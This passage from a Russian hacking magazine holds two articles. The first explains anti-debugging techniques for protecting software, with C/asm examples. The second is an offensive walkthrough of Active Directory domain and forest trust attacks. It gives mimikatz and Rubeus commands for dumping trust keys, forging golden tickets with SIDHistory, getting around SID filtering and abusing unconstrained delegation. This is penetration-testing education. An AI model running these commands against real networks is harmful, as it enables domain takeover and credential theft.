буфера с ключевы ми дан ными многок ратно дублиру ются, и на отслеживание
обращений у взлом щика не хватит ни кон троль ных точек, ни терпения для ана-
лиза огромного объема манипу лиру ющего с ними кода. Будет еще лучше пос-
ле проверки ключевой информации эти же самые буфера исполь зовать
для хранения слу жебных дан ных, обращать ся к которым по возможности мак -
сималь но часто. Это не позволит взлом щику быстро отличить защит ный
механизм от прочего прик ладного кода.
  Посколь ку боль шинство взлом щиков ставит кон троль ную точку на начало
буфера, имеет смысл поместить в первые четыре байта ключа «заг лушку»,
обращения к которой не происходит вовсе (либо с ней манипу лиру ет имитатор
защиты, направляя хакера по ложному пути).
  В такой ситу ации взлом щику ничего не останет ся, кроме как, затарившись
пивом, плот но засесть за кропот ливое изу чение всего кода прог раммы, прямо
или  косвенно манипу лиру ющего ключевой информацией  (а  это многие
мегабайты дизассем блерного листинга!). Если критическая часть кода зашиф-
рована, причем в процессе работы прог раммы не расшифровывается пол-
ностью (при выходе в каждую фун кцию она расшифровывается, а при выходе
зашифровывается вновь), хакер не сможет получить готовый к дизассем бли-
рованию дамп и будет вынужден прибег нуть к трассировке. А вот тут его будет
ждать второй сюрприз!


Êàê ïðîòèâîñòîÿòü òðàññèðîâêå
Прин ципиаль ная возможность создания под линно «невидимых» отладчиков
остается гипотетической — боль шинство из них позволяет обнаружить себя
даже непривилегирован ному коду.
  Наиболь шие нарекания вызывает исполь зование однобайтового кода 0xCC
(инструк ция INT 0x3) для создания точки останова вместо поручения той же
задачи специаль но для этого пред назначен ным отладочным регистрам про-
цессора.  Так  поступают  WinDbg,  SoftICE,  Turbo  Debugger, Code  Viewer
и отладчик, интегрирован ный в Microsoft Visual Studio. Причем последний неяв-
но исполь зует точки останова при пошаговом прогоне прог раммы, помещая
в начало следующей инструк ции этот пресловутый байт 0xCC.
   Тривиаль ная проверка собствен ной целостности позволяет обнаружить
факт установки точек останова, свидетель ству ющий об отладке. Не стоит
исполь зовать конструк ции наподобие


if (CalculateMyCRC() != MyValidCRC) {
      printf("Hello, Hacker!\n");
      return;
}

Их слиш ком лег ко обнаружить и нейтрализовать, под правив условный переход
так, чтобы он всег да передавал управление нужной вет ке прог раммы. Лучше
расшифровывать получен ным значением кон троль ной сум мы критические
дан ные или некоторый код.
   Простейшая  защита,  реализован ная  в  демонстрацион ной  прог рамме
cipherString, может выг лядеть так:


#include <iostream>


int main()
{
    // Зашифрованная строка Hello, Free World!
    char s0[] = "\x0C\x21\x28\x28\x2B\x68\x64\x02\x36\x21\x21\x64\
x13\x2B\x36\x28\x20\x65\x49\x4E";


_asm
{
BeginCode: // Начало контролируемого кода
    pusha   // Сохранение всех регистров общего назначения
    lea ebx, s0 // ebx = &s0[0]
    GetNextChar : // do
    XOR eax, eax // eax = 0;
    LEA esi, BeginCode // esi = &BeginCode
    LEA ecx, EndCode // Вычисление длины...
    SUB ecx, esi // ...контролируемого кода
    HarvestCRC : // do
    LODSB // Загрузка очередного байта в al
    ADD eax, eax // Вычисление контрольной суммы
    LOOP HarvestCRC // until (-cx > 0)
    xor [ebx], ah // Расшифровка очередного символа строки s0
    inc ebx // Указатель на следующий символ
    cmp[ebx], 0 // until (пока не конец строки) 
    jnz GetNextChar // Продолжить расшифровку
    popa // Восстановить все регистры
EndCode : // Конец контролируемого кода
    NOP // Safe Breakpoint
}


std::cout << s0; // Вывод строки на экран


return 0;


}

Обрати внимание, что дан ный код не будет ком пилировать ся для плат формы
x64 ком пилятором Visual C++, посколь ку в нем отсутству ет под держка клю-
чевого слова _asm. Тем не менее для x86 он построится без проблем. Это не
значит, что для x64 нель зя писать прог раммы на C/C++, содержащие ассем -
блерные вставки. Однако в таком слу чае их придет ся оформлять в виде про-
цедур в отдель ных файлах *.asm. В рассмат риваемом слу чае разница между
плат формами для нас нек ритична, так как в наши цели не входит дизассем бли-
рование расшифровщика.
  При нормаль ном запуске на экране должна появить ся строка «Hello, Free
World!».





                       Расшифрован ная строка

А под отладчиком при наличии хотя бы одной точки останова, установленной
в пределах от BeginCode до EndCode, мы увидим следующее.





                      Установлена точка останова

На экране появит ся бессмысленный мусор.





  Вместо стройного приветствия прог рамма вывела бессмысленный набор
  сим волов


Äîïîëíèòåëüíàÿ çàùèòà
Можно усилить защиту, поместив процеду ру под счета кон троль ной сум мы
в  отдель ный  поток,  занимающийся  (для  сок рытия  своей  деятель ности)
еще чем-нибудь полезным, так, чтобы защит ный механизм по возможности
не бросался в глаза.
  Потоки вообще великая вещь, требующая к себе особого под хода. Челове-
ку очень труд но смирить ся с тем, что прог рамма может исполнять ся во мно-
жестве мест одновремен но. Распространен ные отладчики грешат тем, что
отлаживают каждый поток по отдель ности, но никог да два и более сразу. При-
веден ный ниже пример cipherString_thread показы вает, как это можно исполь -
зовать для защиты.


#include <stdio.h>
#include <string.h>
#include <process.h>
// Эта функция будет выполняться в отдельном потоке,
// ее назначение незаметно изменять регистр символов в строке,
// содержащей имя пользователя
void My(void* arg)
{
    int p = 1;  // Указатель на шифруемый байт
    // Обрати внимание: шифровка выполняется не с первого байта.
Это позволяет обойти контрольную точку, установленную на начало
буфера
    // Выполнять до тех пор, пока не встретится перенос строки
    while(((char*)arg)[p] != '\n')
    {
        // Ожидать, пока очередной символ не будет инициализирован
        while(((char *)arg)[p] < 0x20);
        // Инвертировать пятый бит
        // Это приводит к изменению регистра латинских символов
на противоположный
        ((char*)arg)[p] ^= 0x20;
        // Указатель на следующий обрабатываемый байт
        p++;
    }
}


int main(int argc, char* argv[])
{
    char name[100]; // Буфер, содержащий имя пользователя
    char buff[100]; // Буфер, содержащий пароль
    // Забивка буфера имени пользователя нулями
    // Некоторые компиляторы это делают за нас, но не все!
    memset(&name[0], 0, 100);
    // Выполнять процедуру My в отдельном потоке
    _beginthread(&My, NULL, (void *) &name[0]);
    // Запрос имени пользователя
    printf("Enter name: ");
    fgets(&name[0], 66, stdin);
    // Запрос пароля

Важно отметить: пока поль зователь вводит пароль, второй поток получает дос-
таточно кван тов времени, чтобы изменить регистр всех сим волов имени поль -
зователя. Это обстоятель ство не так очевид но и не вытекает из бег лого ана-
лиза прог раммы, особен но при ее исследовании под отладчиком, плохо отсле-
живающим влияние отдель ных ком понен тов прог раммы друг на дру га.


printf("Enter password: ");
fgets(&buff[0], 66, stdin);
// Сравнение имени и пароля c эталонными значениями
if (!(strcmp(&buff[0], "password\n")

Важно отметить: посколь ку введен ное поль зователем имя было преобразова-
но, фак тически происходит сравнение не strcmp(&name[0],  "KPNC\n"),
а strcmp(&name[0], "Kpnc\n"), что далеко не очевид но на первый взгляд.


    || strcmp(&name[0], "KPNC\n")))
    // Правильные имя и пароль
    printf("USER OK\n");
else
    // Ошибка при вводе имени или пароля
    printf("Wrong user or password!\n");
return 0;
}

На первый взгляд, прог рамма ожидает «услы шать» KPNC:password. Но так ли
это на самом деле?




             Неверная пара имени поль зователя и пароля

А вот и нет! Верный ответ — Kpnc:password.





             Правиль ная пара имени поль зователя и пароля

Пока поль зователь вводит свой пароль, второй поток обрабаты вает буфер,
содержащий его имя, и меняет регистр всех сим волов, кроме первого, на про-
тивоположный. Фокус состоит в том, что при пошаговой трассировке одного
потока все осталь ные потоки выполняют ся независимо от него и могут про-
изволь ным образом вклинивать ся в работу отлаживаемого потока, например
модифицировать его код.
   Взять потоки под кон троль можно, введя в каждый из них точку останова,
но, если потоков окажет ся боль ше четырех (а что мешает разработ чику защиты
их создать?), отладочных регистров на всех не хватит и придет ся прибегать
к исполь зованию опкода 0xCC, который защит ному механизму ничего не стоит
обнаружить!


SEH (ñòðóêòóðíàÿ îáðàáîòêà èñêëþ÷åíèé)
Дело осложняется тем, что боль шинство отладчиков очень плохо переносят
прог раммы  со  струк турной  обработ кой  исключений  (SEH).  Инструк ция,
вызывающая обрабаты ваемое исключение, либо «сры вает» отладчик, выходя
из-под его кон троля, либо передает управление на библиотечный филь тр
исключений. А он, прежде чем передать управление прик ладному обработ -
чику, вызывает множество своих слу жебных фун кций, в которых взлом щику
немуд рено и «утонуть».
  Впрочем, по сравнению с ран ними отладчиками даже это боль шой прог -
ресс, так как рань ше они жестко держали некоторые прерывания, не позволяя
прог рамме самостоятель но обрабаты вать, скажем, деление на ноль.
   Вот пример защиты TryExcept, построенный на обработ ке струк турных
исключений:


#include <iostream>
#include <windows.h>


int main()
{
    // Защищенный блок
    __try
    {
        // Попытка деления на ноль
        int a = 1;
        int b = 1;
        int c = 2 / (a - b);

Такая многословность объясняется тем, что боль шинство ком пиляторов выда-
ют ошибку, встретив конструк цию наподобие int a=a/0;. При выполнении
деления отладчики, в том числе WinDbg, теряют кон троль над отлаживаемой
прог раммой и «слетают». Поэтому сюда может быть вставлен для отвода глаз
некий код, который никог да не получит управления. Если значение перемен -
ным a и b присваивает ся не непосредствен но, а из резуль тата, возвращен ного
некими фун кциями, то при дизассем блировании прог раммы их равенство
будет не так очевид но. В резуль тате взлом щик может пот ратить много вре-
мени на анализ совершенно бесполезного кода.


    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        std::cout << "Error";

Этот код получит управление, если возникнет исключение «деление на ноль»,
но отладчики не распознают такой ситу ации. Требует ся ручная установка точки
останова на первую инструк цию блока __except. А чтобы определить адрес
блока __except, требует ся разобрать ся, каким имен но образом реализована
под держка SEH в кон крет ном ком пиляторе. Что опять же пот ребу ет от хакера
неприлично много времени.


    }
}




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





                  ЗАТРУДНЯЕМ АНАЛИЗ ПРОГРАММ




Если попытать ся прог нать приведен ный пример под WinDbg, достигнув строки
int c=c/(a - b), отладчик внезапно «слетит», теряя кон троль над отлажива-
емым приложением. Хотя оператор cout сработает и строка будет выведена,
отладчик, потеряв ориентиры, не сделает остановку на этой строке. Теоре-
тически исправить ситу ацию можно заблаговремен ной установкой точки оста-
нова на первую коман ду блока except, но попробуй-ка вычислить, где рас-
положен этот блок, не заг лядывая в исходный текст, которого у хакера заведо-
мо нет!





              WinDbg перед возникновением исключения





  WinDbg после возникновения исключения теряет кон такт с отлаживаемой
  прог раммой

В идеаль ном мире после срабаты вания исключения WinDbg должен перехо-
дить в область кода __except. Посмотрим, как это должно быть. Установим
точку останова на адрес начала оператора вывода строки Error — std::cout
<< "Error";. При этом вообразим, что у нас нет исходного кода отлаживаемо-
го приложения:


bp 00007ff7`64ff230d

И если после остановки на инструк ции idiv по F5 продолжить выполнять при-
ложение, отладчик нырнет в блок кода __except и остановит ся на инструк ции
заг рузки парамет ра для вывода строки оператором cout.





  WinDbg остановился на поставлен ной вручную точке останова в сек ции
  __except

Прежде чем справить ся с такой защитой, взлом щику придет ся основатель но
изу чить реализацию механизма обработ ки струк турных исключений, как на
уровне операционной системы, так и на уровне кон крет ного ком пилятора.
В подавляющем боль шинстве литературы этот вопрос обходит ся стороной.
И неспроста — реализация SEH действитель но очень сложна, громоздка, мно-
гословна. Все это приводит к тому, что боль шинство прог раммистов и тех-
нических писателей совершенно не пред ставляют, что находит ся у нее «под
капотом».
  Посколь ку SEH по-разному реализована в каждом ком пиляторе, неуди-
витель но, что отладчики отказываются ее под держивать. Поэтому пред ложен -
ный вариант защиты очень стоек к взлому и в то же время крайне прост
в реализации. А самое важное — он одинаково хорошо работает во всех опе-
рационных системах семейства Windows.


Êàê ïðîòèâîñòîÿòü êîíòðîëüíûì òî÷êàì îñòàíîâà
Кон троль ные точки, установленные на важнейшие системные фун кции, —
мощное ору жие в руках взлом щика. Пусть,  к примеру, защита пытается
открыть ключевой файл. Под Windows существу ет толь ко один докумен -
тирован ный способ это сделать — вызвать фун кцию CreateFile (точнее,
CreateFileA или CreateFileW для ASCII- и UNICODE-имени файла соот ветс-
твен но). Все осталь ные фун кции, наподобие OpenFile, доставшиеся в нас-
ледство от ран них версий Windows, на самом деле пред ставляют собой
переход ники к CreateFile.
   Зная об этом, взлом щик может заблаговремен но установить точку останова
на адрес начала этой фун кции (благо он ему известен) и мгновен но локали-
зовать вызывающий эту фун кцию защит ный код, ну а осталь ное, как говорит ся,
дело техники.
  Но не всякий взлом щик знает, что открыть файл можно и дру гим путем —
вызвать фун кцию ZwCreateFile (равно как и NtCreateFile), экспортиру емую
NTDLL.DLL, или обратить ся напрямую к ядру вызовом прерывания INT 0x2Eh.
Сказан ное справед ливо не толь ко для CreateFile, но и для всех осталь ных
фун кций ядра. Причем для этого не нужны никакие привилегии и такой вызов
можно осу ществить даже из прик ладного кода!
  Опыт ного взлом щика такой трюк надолго не остановит, но почему бы ему
не приготовить один малень кий сюрприз, поместив вызов INT 0x2E в блок
__try. Это приведет к тому, что управление получит не ядро системы, а обра-
бот чик дан ного исключения,  находящийся  за блоком __try. Взлом щик,
не имеющий исходных тек стов, не сможет быстро определить, относит ся ли
дан ный вызов к блоку __try или нет. Отсюда он может быть лег ко введен
в заблуждение — достаточно имитировать откры тие файла, не выполняя его
на самом деле! Кроме того, ничто не мешает исполь зовать прерывание INT
0x2E для взаимодействия ком понен тов своей прог раммы — взлом щику будет
очень непросто отличить, какой вызов поль зователь ский, а какой системный.
   Хорошо, с ядром все понят но, а как же быть с фун кциями модулей USER
и GDI? Например, GetWindowsText, исполь зующейся для считывания введен -
ной поль зователем ключевой информации (как правило, серийного номера
или пароля)?
  На помощь приходит то обстоятель ство, что прак тически все эти фун кции
начинаются с инструк ций


PUSH EBP
MOV EBP, ESP

Эти инструк ции могут выполнить прик ладной код и самостоятель но, передав
управление не на начало фун кции, а на три байта ниже. Посколь ку PUSH EBP
изменяет стек, приходит ся прибегать к передаче управления посредством JMP
вместо CALL. Кон троль ная точка, установленная взлом щиком на начало фун -
кции, не возымеет никакого действия! Такой трюк может сбить с толку даже
опыт ного хакера, хотя рано или поздно он все равно раскусит обман.
   Если есть желание окон чатель но отравить взлом щику жизнь, следует ско-
пировать системную фун кцию в свой собствен ный стек и передать на него
управление — кон троль ные точки взлом щика «отды хают»! Между тем надо
отметить, что современ ные версии операционных систем могут запрещать
выполнение кода на определен ных страницах памяти, например в стеке. Эта
фун кция может быть отключена, но стоит иметь ее в виду. Плюс основная
сложность зак лючается в необходимости распознавать все инструк ции с отно-
ситель ными адресны ми аргу мен тами и их соот ветству юще корректировать.
   Например, двойное слово, стоящее после инструк ции CALL, пред ставляет
собой не адрес перехода, а разность целевого адреса и адреса следующей
за CALL инструк ции. Перенос инструк ции CALL на новое место пот ребу ет кор-
рекции ее аргу мен та. Впрочем, эта задача не так сложна, как может показать ся
на первый взгляд (глаза страшат ся, а руки делают), и резуль тат оправды вает
средства. Во-первых, при каждом запуске фун кции можно произволь ным
образом менять ее адрес, во-вторых, проверкой целостности кода лег ко обна-
ружить прог рам мные точки останова — а аппарат ных точек на все вызовы
просто не хватит!
   Разве не заслуживают наг рады за свою целеустрем ленность те индивиду -
умы, которые такую защиту взломают? Под наг радой здесь под разумевает ся
отнюдь не сама взломан ная прог рамма, а глу бокое чувство удовлетворения
от того, что «я это сделал!».
  Еще лег че противостоять аппарат ным точкам останова на память, посколь -
ку их всего четыре и каждая может кон тролировать не более двойного слова.
Соот ветствен но,   взлом щик   может   одновремен но   кон тролировать
не более 16 байт памяти. Если же обращения к содержащим ключевую
информацию буферам будут происходить не последователь но байт за байтом
от начала до кон ца, а произволь но и количество самих буферов окажет ся боль -
ше четырех, отследить все операции чтения-записи в них станет невозможно.
  Некоторые отладчики под держивают возможность установки точки останова
на диапазон памяти, но ее фун кциональ ность вызывает боль шие сом нения.
Единствен ный способ кон тролировать целый регион — трассировать иссле-
дуемую прог рамму, проверяя, не обращает ся ли очеред ная коман да к отсле-
живаемому диапазону, и если да — генерировать исключение.
   Во-первых, манипу лиру ющих с памятью команд очень много, и можно при-
думать самые неожидан ные ком бинации. Например, установить указатель сте-
ка на требуемую ячейку памяти и вызвать RET для чтения содержащегося в ней
значения.  Во-вторых,  возникшее  при  этом  исключение может  слу жить
хорошим средством избавления от трассировщика (см. раздел «Как противос-
тоять трассировке»).
   Таким образом справить ся с кон троль ными точками защит ному механизму
совсем нет рудно!


Òî÷êè îñòàíîâà
Кон троль ная точка (или «бряк» на хакерском жаргоне) пред ставляет собой
однобайтовую коман ду 0xCC, генерирующую исключение 0x3 при попыт ке ее
выполнения (в просторечии «дергающее отладочным прерыванием»). Обра-
бот чик INT 0x3 получает управление и может делать с прог раммой абсолют но
все, что ему заблагорассудит ся, но прежде — до вызова прерывания — в стек
заносят ся текущие регистр флагов, указатель кодового сег мента (регистр CS),
указатель команд (регистр IP), запрещаются прерывания (очищает ся флаг IF)
и сбрасывается флаг трассировки — словом, вызов отладочного прерывания
не отличает ся от вызова любого прерывания.





       Состояние стека на момент входа в обработ чик прерывания

Чтобы узнать, в какой точке прог раммы произошел останов, отладчик извле-
кает из стека сохранен ное значение регистров, не забывая о том, что CS:IP
указывают на следующую выполняемую коман ду.




Стоит отметить, что описан ный выше вариант адресации команд в процес-
сорах на архитек туре x86_64 работает в режиме совместимости. То есть IP —
16-разрядный регистр, имевший место в самых ран них мик ропроцессорах
линейки 8086. В процессорах марки 80386 регистр был расширен до 32 бит
и получил название EIP, при этом доступ к млад шей 16-разрядной части
остался. В осталь ном же указатель команд работал по прежнему прин ципу.
  Вместе  с  выпуском  процессоров  на  расширен ной   архитек туре
AMD64 регистр указателя команд расширился до 64 бит и стал называть ся
RIP. Доступ к обеим млад шим частям был оставлен для обратной совмести-
мости. Это стало называть ся режимом совместимости. Между тем одной
из  целей,  преследу емых при проектировании новой  архитек туры, было
избавление от сег ментов кода, дан ных ( CS, DS) и прочих. Поэтому в 64-раз-
рядные процессоры был введен новый метод адресации RIP-relative (RIP-отно-
ситель ная адресация). В этом режиме сег мент кода не исполь зует ся и вся
арифметика с указателем выполняет ся относитель но значения регистра RIP
следующей коман ды.


Условно точки останова (называемые так же кон троль ными точками) можно
разделить на две категории: точки останова, жестко прописан ные в прог рамме
самим разработ чиком, и точки динамические, устанавливаемые отладчиком.
Ну, с первыми все ясно: хочешь остановить прог рамму и передать управление
отладчику в таком-то месте — пишешь __asm {int 0x3}.
  Несколь ко сложнее установить точку в произволь ное место прог раммы:
сначала отладчик должен сохранить текущее значение ячейки памяти по ука-
зан ному адресу, затем записать сюда код 0xCC, а перед выходом из отладоч-
ного прерывания вернуть все на место и модифицировать сохранен ный в стеке
IP для перемещения его на начало восстановленной коман ды (иначе он будет
указывать на ее середину).
   Какими  недостатками  обладает  механизм  точек  останова  процес-
сора 8086? Первое и самое неприят ное состоит в том, что отладчик, устанав-
ливая точку останова, вынужден непосредствен но модифицировать код.
  Причем WinDbg неявно помещает точку останова в начало каждой сле-
дующей коман ды при трассировке прог раммы по Step Over (клавиша F10)!
Разумеется, это искажает кон троль ную сум му, чем и поль зует ся защита. Этот
эффект мы мог ли наблюдать, разбирая пример cipherString.
  Самое простое решение проблемы — положить кирпич на клавишу F8
(покоман дная трассировка — Step Into) и идти пить чай, пока прог рамма будет
расшифровывать ся. Шут ка, конечно. А если говорить серь езно, то необходимо
вспом нить, в каком веке мы живем, и, отбросив камен ные топоры, установить
аппарат ную точку останова!


ÈÒÎÃÈ
Мы изу чили варианты «побега из-под отладчика», дру гими словами — рас-
смот рели методы противостояния отладочным механизмам, а так же узнали,
каким образом можно защитить свою прог рамму от посторон него исследова-
ния и вмешатель ства в ее работу извне. Получилось, что на каждый отладоч-
ный механизм имеется по мень шей мере одно средство противодействия.
  Обладая современ ными средствами, любую защиту можно взломать,
поэтому главная задача разработ чика защиты — запутать хакера, ввести его
в заблуждение, чтобы жизнь медом не казалась и цен ность времен ного про-
межут ка, необходимого для взлома защиты, стала бы выше цен ности резуль -
тата взлома.
ВЗЛОМ





                  КАК РАБОТАЮТ АТАКИ
                    НА ДОВЕРЕННЫЕ
                     ОТНОШЕНИЯ
              ДОМЕНОВ И ЛЕСОВ AD





Active  Directory поз воля ет стро ить сети
со  сложной  архи тек турой,  вклю чающей
несколько доменов и лесов, которые под -
держи вают определен ную иерар хию вза -
имно го  доверия.  Подобные  системы        MichelleVermishelle                                                                                17 y.o. | TG - @cXestXlaXvie
неидеальны с точ ки зрения безопасности,      michael.zhmailo@yandex.ru
и, хорошо раз бира ясь в их устрой стве,
взлом щик может получить к ним несан кци -
они рован ный доступ. В этой статье мы
раз берем несколько видов атак на отно -
шения доменов и лесов в Active Directory.




                       Статья имеет озна коми тельный характер и пред -
                       назна чена для специалис тов по безопас ности,
                       проводя щих тес тирова ние в рамках контракта.
                       Автор и  редакция  не  несут  ответс твенности
                        за любой  вред, при чиненный  с при менением
                       изложенной информа ции. Рас простра нение вре-
                      донос ных прог рамм, нарушение работы сис тем
                      и  нарушение  тай ны  перепис ки  прес леду ются
                      по закону.


Множество ком паний исполь зует среду Active Directory для администрирова-
ния сети своей организации. Ком пании растут, домен расширяется, и рано
или поздно наступает момент, ког да требует ся создать в домене дру гие
домены, чтобы разграничить поль зователей, обязан ности, да и, в кон це кон -
цов, позаботить ся о безопасности.
  Допустим, у нас есть ком пания MISHA Corporation. У нее может быть домен
misha.local для администраторов, bank.misha.local для финан сового
отдела, dev.misha.local для разработ чиков и так далее.
  Доверие между дву мя доменами может быть двусторон ним — поль зовате-
ли домена bank.misha.local могут получать доступ к ресурсам dev.misha.
local, а поль зователи dev.misha.local — к bank.misha.local. А может
быть односторон ним — в таком слу чае лишь поль зователи одного определен -
ного домена имеют доступ к ресурсам дру гого. Допустим, учет ные записи
домена dev.misha.local могут ходить в домен bank.misha.local, а вот
поль зователи bank.misha.local в dev.misha.local не могут.





Наша прек расная ком пания продолжает расширять ся и покупает дру гую ком -
панию, назовем ее MYCRASOFT  Corporation. У этой фирмы  так же есть
домен — mycra.local, в нем имеются поль зователи, сервисы, группы. Все
настроено и отлично работает. Само собой, теперь поль зователям домена
misha хотелось бы получить доступ к этому домену. Здесь мы плавно перехо-
дим к понятию леса.
   Лес — самая крупная струк тура в AD. Внут ри леса находят ся деревья —
некий набор доменов (misha.local, bank.misha.local, dev.misha.local).
Между лесами так же можно настроить как односторон нее, так и двусторон нее
доверие.
  Мы рассмот рим безопасность этих доверен ных отношений. Опишем набор
атак — от простых к сложным — и разберем такие темы, как SID Filtering, PAM
Trust, TGT Delegation.
   Ког да я пишу «между лесами», я имею в виду атаку, которая выполняет ся
из одного леса на дру гой, например misha.local <-> priv.local. Если я
пишу «между доменами», то я имею в виду атаку между деревь ями (dev.
misha.local  <->  misha.local). Чтобы понимать, о чем  тут идет речь,
читателю нужно разбирать ся в  Kerberos, делегировании, а  так же иметь
базовые знания в Active Directory, так как статья не пред полагает объяснение
этих технологий, а лишь рассмат ривает их возможные недостатки.


ÐÀÇÂÅÄÊÀ

Сначала пред лагаю определить масштаб проблемы. Иног да мы будем исполь -
зовать PowerView и Active Directory Module для перечисления объектов.


Ëåñà
Вы явить все отношения между лесами поможет встроенный инстру мент nltest:


nltest /domain_trusts





                                        Nltest

Из вывода мы видим, что в исследуемой сети целых три леса. Между ними
всеми установлено двусторон нее доверие, а production.local имеет атрибут
enable_tgt, о котором мы поговорим нем ного позже.
  Соберем чуть боль ше информации с помощью следующих инстру мен тов:


# Получить информацию о лесе
    # PowerView
        Get-Forest
        Get-Forest -Forest priv.local


    # AD Module
        Get-ADForest
        Get-ADForest -Identity priv.local


# Получить все домены в лесе
    # PowerView
        # PowerView v3
        Get-ForestDomain
        Get-ForestDomain -Forest priv.local


        # PowerView v2
        Get-NetForestDomain -Verbose
        Get-NetForestDomain -Forest priv.local


    # AD Module
        (Get-ADForest).Domains





Äîìåíû
Конечно же, мы можем исполь зовать nltest с приведен ным выше син таксисом,
чтобы узнать отношения и внут ри леса, но рассмот рим вариант с PowerView
и AD Module:


# PowerView
    #v3
    Get-DomainTrust
    Get-DomainTrust -Domain priv.local
    Get-DomainTrust -SearchBase GC://priv.local


    # v2
    Get-NetDomainTrust -Domain priv.local


        # Найти все внешние (external) доверия в текущем лесе
            Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}


# AD Module
    Get-ADTrust
    Get-ADTrust -Identity priv.local

Получен ный нами вывод показы вает связи и отношения внут ри леса в иссле-
дуемой сети.





                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                              КАК РАБОТАЮТ АТАКИ
                     НА ДОВЕРЕННЫЕ ОТНОШЕНИЯ
                        ДОМЕНОВ И ЛЕСОВ AD





TRUST KEYS

Äîìåíû
Обеспечивает безопасность специаль ный ключ — ключ доверия, который
автоматически генерирует ся при создании отношений. При установлении
доверия в каждом домене создает ся связан ный поль зователь ский объект
для хранения ключа доверия. Имя поль зователя — это NetBIOS-имя дру гого
домена, которое закан чивается сим волом $ (аналогично имени учет ной записи
компь ютера). Например, в слу чае доверия между доменами misha.local
и mycra.local домен misha будет хранить ключ доверия в поль зователе
mycra$, а домен mycra будет хранить его в поль зователе misha$.
  Мы можем извлечь этот ключ, сдам пив ntds.dit, например с помощью
mimikatz (мы должны находить ся в высокопривилегирован ном кон тек сте):


privilege::debug
lsadump::trust /patch





Так же ключ можно извлечь из хранилища lsa:


lsadump::lsa /patch





Между доменами по умолчанию всег да применяется шифрование AES, а меж-
ду лесами — RC4. В связи с этим мы должны исполь зовать хеш NTLM, если
генерируем билет для даль нейшего прод вижения по лесам. И, соот ветствен -
но, ключ AES, если перемещаем ся между доменами.
   Резон ный вопрос: зачем так ухищрять ся, если при исполь зовании NTLM
просто произойдет даун грейд до RC4? Ответ прост: генерировать билет
подобным образом следует для боль шей скрыт ности от систем защиты. Сов-
ремен ные СЗИ умеют детек тировать понижение шифрования «Кербероса»
до RC4, в связи с этим исполь зуй AES, если желаешь оставать ся невидим кой.
   Генерировать билет для доступа к ресурсам дру гого домена или леса мож-
но вот так:


kerberos::golden /domain:<текущий домен> /sid:<
SID_текущего_домена> /sids:<SID_enterprise_admins корневого или
атакуемого домена> /rc4:<domain_trust_key> /user:<на чье имя
билет> /service:<на какой сервис> /target:<FQDN целевого домена> /
ticket:ticket.kirbi


kerberos::golden /domain:priv.local /sid:S-1-5-21-210670787-
2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-
2406986946-519 /rc4:e5051441f6b1b81bc9de55f1ef3eda26d /user:
Administrator /service:krbtgt /target:megabank.local /ticket:
ticket.kirbi

Зачем нам нужна опция /sids? Это называется атакой SIDHistory. Если очень
корот ко, то дан ный атрибут слу жит для сценариев миг рации. Мы записы ваем
в билет, что поль зователь, указан ный флагом /user, принад лежит группе
с SID, указан ной с помощью /sids. В ней лучше всего указывать SID группы
Enterprise Admins, получен ный с корневого либо атакуемого домена (домен
dev.misha.local, корневой для него — misha.local). Сделать это можно вот
так:


dsquery * "CN=Enterprise Admins,CN=Users,DC=megabank,DC=local" -
attr objectsid


# AD Module
Get-ADGroupMember -Identity 'Enterprise Admins' -Server megabank.
local


# PowerView
Get-DomainGroup -Identity 'Enterprise Admins' -Domain megabank.
local | select ObjectSid

Наконец, исполь зуя получен ный тикет, можно запрашивать TGS на сервисы
дру гого домена:


.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:CIFS/dc.
megabank.local /dc:dc.megabank.local /ptt


Ëåñà
А теперь пора поговорить о под водных кам нях. Казалось бы, в атаке нет ничего
сложного. Да, действитель но, между доменами она сработает без проблем,
но, как толь ко мы начнем атаковать леса, столкнем ся с раздражающим Access
Denied. Пом нишь ли ты про опцию /sids? Наша беда зак лючается имен но
в ней.
   Возможно, мы сумеем получить доступ к каким-либо ресурсам в дру гом
лесе, но зачастую количество этих ресурсов будет ограничено, если у нас
вообще что-то получит ся. Проблема кроется в так называемом SID Filtering —
специаль ной системе, которая филь тру ет из SIDHistory пересекающие границу
леса SID с высокими привилегиями, не позволяя получить доступ куда-либо.
У группы Enterprise Admins по умолчанию RID составляет 519. Да и в прин -
ципе у всех более-менее привилегирован ных групп RID < 1000. Ты уже
догадался, как мы будем обходить это ограничение?
  Сначала пред лагаю проверить наличие этого самого SID Filtering:


# AD Module
    Get-ADTrust -Filter *





Значение SIDFilteringForestAware установлено в True. В связи с этим мы
должны будем найти группы, у которых RID > 1000. Эти группы мы внед рим
в SIDHistory и сможем получить доступ к дру гому лесу.
  Искать можно следующим образом:


# AD Module
    Get-ADGroup -Filter 'SID -ge "<SID атакуемого леса>-1000"'
-Server <атакуемый лес>





Видим  интересную  группу  EUAdmins  с  SID  S-1-5-21-4066061358-
3942393892-617142613-1103, поэтому генерируем тикет, как описано выше,
но указывая в SIDHistory SID этой группы.


Âûäàåì ñåáÿ çà êîíòðîëëåð äîìåíà
Теперь ты знаешь, что такое SIDHistory, поэтому мы можем даже выдать себя
за кон троллер домена:


kerberos::golden /user:<имя УЗ текущего ДК> /domain:<текущий
домен> /sid:<SID текущего домена> /groups:516 /krbtgt:<krbtgt-хеш
текущего домена> /sids:<SID группы Domain Controllers>,S-1-5-9 /
ptt

Опцией /groups:516 мы указали RID группы кон троллеров домена, а /sids:
S-1-5-9 — группа Enterprise Domain Controllers. Ты можешь поэк спе-
римен тировать со стан дартны ми SID, их струк туры пред ставлены здесь .


Íåîãðàíè÷åííîå äåëåãèðîâàíèå
Как я уже сказал, не буду вдавать ся в теоретические под робности неог -
раничен ного делегирования —  у «Хакера» есть прек расный цикл статей
по безопасности AD от автора Ralf Hacker, который рассмат ривает эту тех-
нологию в том числе. Мы же взглянем на нее как на дополнитель ный век тор
атаки на отношения.


Ìåæäó äîìåíàìè
По умолчанию на всех кон троллерах домена включено неог раничен ное делеги-
рование. В связи с этим мы можем «заставить» атакуемый кон троллер домена
обратить ся   к  нашим  ресурсам,  допустим  с  помощью  PrinterBug
или PetitPotam. Син таксис будет примерно следующий:


# Запускаем монитор «Рубеуса»
Rubeus.exe monitor /targetuser:dc01$ /internal:5 /nowrap


# Триггерим PrinterBug
